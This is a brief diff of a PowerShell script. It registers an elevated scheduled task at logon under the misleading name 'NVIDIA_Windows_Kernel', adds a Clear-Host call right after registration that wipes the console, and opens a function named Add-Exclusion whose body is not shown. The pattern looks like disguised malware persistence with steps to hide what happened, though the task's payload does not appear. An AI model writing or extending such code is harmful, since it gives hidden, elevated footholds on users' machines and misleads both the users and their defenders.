@@ -5,6 +5,7 @@ function AddTask{
 "@
     $trigger = New-ScheduledTaskTrigger -AtLogon
     Register-ScheduledTask -TaskName "NVIDIA_Windows_Kernel" -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction Stop
+    Clear-Host
 }
 
 function Add-Exclusion {
